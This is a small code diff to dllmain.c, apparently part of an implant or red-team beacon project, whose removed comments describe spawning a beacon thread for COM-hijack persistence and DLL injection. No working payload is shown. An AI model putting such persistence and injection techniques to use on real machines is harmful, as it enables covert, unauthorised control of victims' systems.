@@ -1,10 +1,6 @@
-// src/dllmain.c
-// Minimal DllMain — spawns beacon_run() in a new thread
-// Used for COM hijack persistence (Mod 180) and DLL injection (Mod 114)
-#include <windows.h>
-#include <stdio.h>
+#include "common.h"
+#include "beacon.h"
 
-extern VOID beacon_run();
 
 static DWORD WINAPI BeaconThread(LPVOID lpParam) {
     (void)lpParam;
